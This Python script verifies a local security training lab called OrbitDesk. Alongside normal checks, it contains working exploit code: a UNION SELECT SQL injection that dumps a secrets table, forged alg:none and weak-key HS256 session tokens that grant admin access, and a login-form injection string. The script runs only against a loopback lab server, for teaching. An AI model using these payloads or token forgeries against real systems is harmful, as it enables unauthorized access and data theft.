#!/usr/bin/env python3
"""Acceptance verification for the OrbitDesk training lab.

What this script does:
  1. Starts labs/orbitdesk/server.py itself on 127.0.0.1:4103 (and refuses to
     run if the port is already busy).
  2. Checks the healthy, correctly-rejected paths (login, auth redirects,
     non-admin 403, unknown-ticket 404, safe post-login redirect).
  3. Signs in with the demo agent credentials.
  4. Proves the SQL injection flag with an exact UNION SELECT request against
     /search?q=.
  5. Proves the admin flag with an exact forged session token (unsigned
     alg:none token, plus the weak HS256 dev key variant).
  6. Stops the server again and asserts that port 4103 was released.

Exit code 0 means every check passed. Stdlib only.
"""

import base64
import hashlib
import hmac
import http.client
import json
import os
import re
import socket
import subprocess
import sys
import time
import traceback
import urllib.parse
from pathlib import Path

LAB_DIR = Path(__file__).resolve().parent
SERVER_SCRIPT = LAB_DIR / "server.py"
LOG_PATH = LAB_DIR / "verify-server.log"

HOST = "127.0.0.1"
PORT = 4103

SESSION_COOKIE = "orbit_session"
AGENT_EMAIL = "agent@orbitdesk.test"
AGENT_PASSWORD = "orbit123"
JWT_SECRET = "orbitdesk-dev-secret"  # documented weak dev key (lab weakness)

SQLI_FLAG = "HMW{orbitdesk_sqli_un10n_s3cr3ts_l34k_7f3a}"
ADMIN_FLAG = "HMW{orbitdesk_admin_alg_n0ne_4dm1n_c0ns0le_9c1d}"

SQLI_PAYLOAD = (
    "zzz' UNION SELECT id,name,value,scope,'leaked',created_at FROM secrets-- -"
)

RESULTS = []


# --------------------------------------------------------------------------
# Helpers
# --------------------------------------------------------------------------

def check(name, ok, detail=""):
    ok = bool(ok)
    RESULTS.append((name, ok))
    line = "[PASS] " if ok else "[FAIL] "
    line += name
    if detail:
        line += " -- " + str(detail)
    print(line, flush=True)
    return ok


def request(method, path, headers=None, form=None):
    """Perform one HTTP request without following redirects."""
    connection = http.client.HTTPConnection(HOST, PORT, timeout=10)
    header_map = dict(headers or {})
    body = None
    if form is not None:
        body = urllib.parse.urlencode(form).encode("utf-8")
        header_map["Content-Type"] = "application/x-www-form-urlencoded"
        header_map["Content-Length"] = str(len(body))
    try:
        connection.request(method, path, body=body, headers=header_map)
        response = connection.getresponse()
        raw = response.read()
        return (
            response.status,
            response.getheaders(),
            raw.decode("utf-8", "replace"),
        )
    finally:
        connection.close()


def header_value(headers, name):
    wanted = name.lower()
    for key, value in headers:
        if key.lower() == wanted:
            return value
    return None


def cookie_header(token):
    return {"Cookie": "%s=%s" % (SESSION_COOKIE, token)}


def token_from(header, payload, signature=""):
    """Build an orbit-session token (header.payload.signature, base64url)."""
    encoded_header = base64.urlsafe_b64encode(
        json.dumps(header, separators=(",", ":")).encode("utf-8")
    ).decode("ascii").rstrip("=")
    encoded_payload = base64.urlsafe_b64encode(
        json.dumps(payload, separators=(",", ":")).encode("utf-8")
    ).decode("ascii").rstrip("=")
    return encoded_header + "." + encoded_payload + "." + signature


def decode_token_part(part):
    padded = part + "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(padded).decode("utf-8"))


def port_is_open():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    try:
        return sock.connect_ex((HOST, PORT)) == 0
    finally:
        sock.close()


def read_server_log(limit=6000):
    try:
        text = LOG_PATH.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return "(no server log available)"
    if len(text) > limit:
        return "...(truncated)...\n" + text[-limit:]
    return text


def wait_for_health(proc, timeout=20.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if proc.poll() is not None:
            return False
        try:
            status, _headers, body = request("GET", "/healthz")
            if status == 200 and "orbitdesk ok" in body:
                return True
        except (OSError, http.client.HTTPException):
            pass
        time.sleep(0.15)
    return False


def stop_server(proc, log_handle):
    """Terminate the lab server, close its log and confirm the port is free."""
    if proc is not None and proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            proc.kill()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                pass
    if log_handle is not None:
        try:
            log_handle.flush()
            log_handle.close()
        except OSError:
            pass
    deadline = time.time() + 8
    while time.time() < deadline:
        if not port_is_open():
            return True
        time.sleep(0.1)
    return False


def loopback_binding_check():
    """Return (ok or None, detail) by inspecting the OS listener table."""
    if os.name != "nt":
        return None, "skipped (listener-table check implemented for Windows)"
    try:
        completed = subprocess.run(
            ["netstat", "-ano", "-p", "TCP"],
            capture_output=True,
            text=True,
            errors="replace",
            timeout=20,
        )
    except (OSError, subprocess.SubprocessError) as exc:
        return None, "skipped (%s)" % exc
    listeners = []
    for line in completed.stdout.splitlines():
        if ":%d" % PORT not in line:
            continue
        fields = line.split()
        if len(fields) < 4 or fields[0].upper() != "TCP":
            continue
        if "LISTEN" not in fields[3].upper():
            continue
        listeners.append(fields[1])
    if not listeners:
        return None, "skipped (no LISTENING entry found for port %d)" % PORT
    ok = all(
        address.startswith("127.0.0.1:")
        or address.startswith("[::1]:")
        or address.startswith("::1:")
        for address in listeners
    )
    return ok, "listeners: " + ", ".join(listeners)


# --------------------------------------------------------------------------
# Checks
# --------------------------------------------------------------------------

def execute_checks():
    # -- server + binding ---------------------------------------------------
    binding_ok, binding_detail = loopback_binding_check()
    if binding_ok is None:
        check("server listener is loopback-only", True, binding_detail)
    else:
        check("server listener is loopback-only", binding_ok, binding_detail)

    source = SERVER_SCRIPT.read_text(encoding="utf-8")
    check(
        "server.py hard-codes BIND_HOST 127.0.0.1 and port 4103",
        'BIND_HOST = "127.0.0.1"' in source and "BIND_PORT = 4103" in source,
    )

    status, _headers, _body = request("GET", "/healthz")
    check("GET /healthz returns 200", status == 200, "status=%s" % status)

    # -- public pages and correct rejections --------------------------------
    status, headers, _body = request("GET", "/")
    location = header_value(headers, "Location") or ""
    check(
        "GET / redirects anonymous visitors to /login",
        status == 302 and location == "/login",
        "status=%s location=%s" % (status, location),
    )

    status, _headers, body = request("GET", "/login")
    check(
        "GET /login shows demo agent credentials",
        status == 200
        and AGENT_EMAIL in body
        and AGENT_PASSWORD in body
        and 'action="/login"' in body,
        "status=%s" % status,
    )

    status, headers, _body = request("GET", "/search?q=invoice")
    location = header_value(headers, "Location") or ""
    check(
        "GET /search without a session redirects to login (rejected)",
        status == 302 and location.startswith("/login?next="),
        "status=%s location=%s" % (status, location),
    )

    status, headers, _body = request("GET", "/admin/flag")
    location = header_value(headers, "Location") or ""
    check(
        "GET /admin/flag without a session redirects to login (rejected)",
        status == 302 and location.startswith("/login?next="),
        "status=%s location=%s" % (status, location),
    )

    status, headers, _body = request(
        "POST",
        "/login",
        form={"email": AGENT_EMAIL, "password": "definitely-wrong"},
    )
    location = header_value(headers, "Location") or ""
    check(
        "wrong password is rejected",
        status == 302 and "error=invalid" in location,
        "status=%s location=%s" % (status, location),
    )

    status, headers, _body = request(
        "POST",
        "/login",
        form={"email": "' OR '1'='1' -- ", "password": "x"},
    )
    location = header_value(headers, "Location") or ""
    check(
        "SQL injection in the login form does nothing (parameterized query)",
        status == 302 and "error=invalid" in location,
        "status=%s location=%s" % (status, location),
    )

    status, _headers, _body = request("GET", "/no-such-page")
    check("unknown path returns 404", status == 404, "status=%s" % status)

    # -- authenticated agent flow ------------------------------------------
    status, headers, _body = request(
        "POST",
        "/login",
        form={"email": AGENT_EMAIL, "password": AGENT_PASSWORD},
    )
    set_cookie = header_value(headers, "Set-Cookie") or ""
    match = re.search(r"%s=([^;,\s]+)" % SESSION_COOKIE, set_cookie)
    agent_token = match.group(1) if match else ""
    check(
        "demo agent can sign in and receives an orbit_session token",
        status == 303 and bool(agent_token),
        "status=%s" % status,
    )

    status, _headers, body = request("GET", "/tickets", headers=cookie_header(agent_token))
    ticket_refs = sorted(set(re.findall(r"OD-10\d\d", body)))
    check(
        "GET /tickets lists at least 5 synthetic tickets",
        status == 200 and len(ticket_refs) >= 5,
        "tickets=%d" % len(ticket_refs),
    )

    status, _headers, body = request("GET", "/tickets/3", headers=cookie_header(agent_token))
    check(
        "GET /tickets/3 shows the invoice ticket detail",
        status == 200 and "Invoice PDF" in body,
        "status=%s" % status,
    )

    status, _headers, _body = request(
        "GET", "/tickets/9999", headers=cookie_header(agent_token)
    )
    check("unknown ticket id returns 404", status == 404, "status=%s" % status)

    status, _headers, body = request(
        "GET", "/search?q=invoice", headers=cookie_header(agent_token)
    )
    check(
        "normal ticket search still works",
        status == 200 and "Invoice PDF" in body,
        "status=%s" % status,
    )

    status, _headers, body = request(
        "GET", "/search?q=" + urllib.parse.quote_plus("O'Brien"),
        headers=cookie_header(agent_token),
    )
    check(
        "malformed quote in search leaks a SQL error page (breakage signal)",
        status == 500 and "Search query failed" in body,
        "status=%s" % status,
    )

    # -- SQL injection flag -------------------------------------------------
    injection_path = "/search?q=" + urllib.parse.quote_plus(SQLI_PAYLOAD)
    status, _headers, body = request(
        "GET", injection_path, headers=cookie_header(agent_token)
    )
    check(
        "SQL injection: UNION SELECT from secrets returns the SQLi flag",
        status == 200 and SQLI_FLAG in body,
        "status=%s found=%s" % (status, SQLI_FLAG in body),
    )
    check(
        "SQL injection dump includes the leaked session signing key row",
        "SESSION_SIGNING_KEY" in body and JWT_SECRET in body,
    )

    # -- admin rejections ---------------------------------------------------
    status, _headers, body = request(
        "GET", "/admin/flag", headers=cookie_header(agent_token)
    )
    check(
        "agent role is rejected on /admin/flag (403)",
        status == 403 and ADMIN_FLAG not in body,
        "status=%s" % status,
    )

    status, _headers, _body = request("GET", "/admin", headers=cookie_header(agent_token))
    check("agent role is rejected on /admin (403)", status == 403, "status=%s" % status)

    # Tamper with the payload but keep the original HS256 signature.
    parts = agent_token.split(".")
    tampered_payload = decode_token_part(parts[1])
    tampered_payload["role"] = "admin"
    tampered_header = decode_token_part(parts[0])
    tampered_token = token_from(tampered_header, tampered_payload, parts[2])
    status, headers, body = request(
        "GET", "/admin/flag", headers=cookie_header(tampered_token)
    )
    location = header_value(headers, "Location") or ""
    check(
        "tampered signed token is correctly rejected",
        status in (302, 403)
        and ADMIN_FLAG not in body
        and (status == 403 or location.startswith("/login")),
        "status=%s location=%s" % (status, location),
    )

    # -- admin bypass: alg:none --------------------------------------------
    admin_payload = {
        "sub": AGENT_EMAIL,
        "name": "Lab Operator",
        "role": "admin",
        "iat": int(time.time()),
        "iss": "orbitdesk",
    }
    none_token = token_from({"alg": "none", "typ": "JWT"}, admin_payload)
    status, _headers, body = request(
        "GET", "/admin/flag", headers=cookie_header(none_token)
    )
    check(
        "admin bypass: unsigned alg:none token opens /admin/flag",
        status == 200 and ADMIN_FLAG in body,
        "status=%s" % status,
    )

    status, _headers, body = request(
        "GET", "/admin", headers=cookie_header(none_token)
    )
    check(
        "admin console dashboard renders for the forged admin session",
        status == 200 and "Secure flag vault" in body,
        "status=%s" % status,
    )

    # The leaked signing key can also mint a valid HS256 admin token.
    hs_header = {"alg": "HS256", "typ": "JWT"}
    encoded = token_from(hs_header, admin_payload).rstrip(".")
    signature = hmac.new(
        JWT_SECRET.encode("utf-8"), encoded.encode("utf-8"), hashlib.sha256
    ).hexdigest()
    hs_token = encoded + "." + signature
    status, _headers, body = request(
        "GET", "/admin/flag", headers=cookie_header(hs_token)
    )
    check(
        "admin bypass: weak HS256 dev key mints an admin token",
        status == 200 and ADMIN_FLAG in body,
        "status=%s" % status,
    )

    # -- misc hardening-ish rejections -------------------------------------
    status, headers, _body = request(
        "POST",
        "/login",
        form={
            "email": AGENT_EMAIL,
            "password": AGENT_PASSWORD,
            "next": "https://evil.example/phish",
        },
    )
    location = header_value(headers, "Location") or ""
    check(
        "off-site post-login redirect is not followed (safe next path)",
        status == 303 and location == "/tickets",
        "status=%s location=%s" % (status, location),
    )

    status, headers, body = request(
        "GET", "/api/me", headers=cookie_header(agent_token)
    )
    check(
        "GET /api/me reports the agent role from the session token",
        status == 200 and '"role": "agent"' in body,
        "status=%s" % status,
    )

    status, headers, _body = request(
        "GET", "/logout", headers=cookie_header(agent_token)
    )
    set_cookie = header_value(headers, "Set-Cookie") or ""
    location = header_value(headers, "Location") or ""
    check(
        "GET /logout clears the session cookie",
        status == 303
        and location == "/login"
        and "Max-Age=0" in set_cookie,
        "status=%s location=%s" % (status, location),
    )


# --------------------------------------------------------------------------
# Entry point
# --------------------------------------------------------------------------

def main():
    print("OrbitDesk lab verification")
    print("Server : %s" % SERVER_SCRIPT)
    print("Target : http://%s:%d" % (HOST, PORT))
    print("=" * 72)

    if port_is_open():
        print(
            "ERROR: %s:%d is already in use. Stop the running OrbitDesk lab "
            "first." % (HOST, PORT)
        )
        return 1

    log_handle = None
    process = None
    try:
        log_handle = open(LOG_PATH, "w", encoding="utf-8")
        process = subprocess.Popen(
            [sys.executable, str(SERVER_SCRIPT)],
            cwd=str(LAB_DIR),
            stdout=log_handle,
            stderr=subprocess.STDOUT,
        )
        if not wait_for_health(process):
            check("server started and /healthz responds", False, read_server_log())
        else:
            check("server started and /healthz responds", True)
            execute_checks()
    except Exception as exc:  # noqa: BLE001 - report, then clean up
        traceback.print_exc()
        check("verification run completed without exceptions", False, repr(exc))
    finally:
        stopped = stop_server(process, log_handle)
        check("server stopped and port %d released" % PORT, stopped)

    failed = [name for name, ok in RESULTS if not ok]
    print("-" * 72)
    if failed:
        print("RESULT: FAILED - %d of %d checks failed" % (len(failed), len(RESULTS)))
        for name in failed:
            print("  failed: " + name)
        print()
        print("Server log:")
        print(read_server_log())
        return 1

    try:
        LOG_PATH.unlink()
    except OSError:
        pass

    print("RESULT: ALL CHECKS PASSED (%d checks)" % len(RESULTS))
    print()
    print("Proof 1 - SQL injection in /search?q= (signed in as %s):" % AGENT_EMAIL)
    print("  GET /search?q=%s" % urllib.parse.quote_plus(SQLI_PAYLOAD))
    print("  -> %s" % SQLI_FLAG)
    print()
    print("Proof 2 - session admin bypass on /admin/flag:")
    print("  Cookie: %s=<token with header alg=none and claim role=admin>" % SESSION_COOKIE)
    print("  GET /admin/flag")
    print("  -> %s" % ADMIN_FLAG)
    print()
    print("No server process is left running.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
